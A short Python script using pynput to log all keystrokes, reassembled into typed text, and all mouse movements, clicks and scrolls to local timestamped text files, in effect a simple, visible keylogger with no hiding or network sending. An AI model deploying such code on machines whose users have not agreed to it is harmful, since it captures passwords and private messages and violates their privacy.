from typing import List
import pynput
from datetime import datetime

# Define constants
LOG_FILE = "log.txt"
MOUSE_RECORD_FILE = "mouse_record.txt"
MAX_KEYS = 10

# Initialize key counter and list of keys
count = 0
keys = []


def on_press(key):
    global keys, count

    # Append key to list and increment counter
    keys.append(key)
    count += 1

    # Print key to console
    print(f"Pressed: {key}")

    # Write keys to file if count threshold is reached
    if count >= MAX_KEYS:
        write_file(keys)
        keys = []
        count = 0


def write_file(keys):
    with open(LOG_FILE, "a") as f:
        now = datetime.now()
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
        f.write(f"\n\n{date_time}\n")
        words = []
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.enter":
                f.write("".join(words) + "\n")
                words = []
            elif k == "Key.space":
                words.append(" ")
            elif k.find("Key") == -1:
                words.append(k)
        f.write("".join(words))


def on_move(x, y):
    with open(MOUSE_RECORD_FILE, "a") as f:
        now = datetime.now()
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
        f.write(f"{date_time}: Mouse moved to ({x}, {y})\n")


def on_click(x, y, button, pressed):
    with open(MOUSE_RECORD_FILE, "a") as f:
        now = datetime.now()
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
        if pressed:
            f.write(
                f"{date_time}: Mouse clicked at ({x}, {y}) with {button} button pressed\n")
        else:
            f.write(
                f"{date_time}: Mouse released at ({x}, {y}) with {button} button released\n")


def on_scroll(x, y, dx, dy):
    with open(MOUSE_RECORD_FILE, "a") as f:
        now = datetime.now()
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
        f.write(
            f"{date_time}: Mouse scrolled at ({x}, {y}) with ({dx}, {dy}) direction\n")


def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False


# Start listener
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    with pynput.mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as mouse_listener:
        listener.join()
        mouse_listener.join()
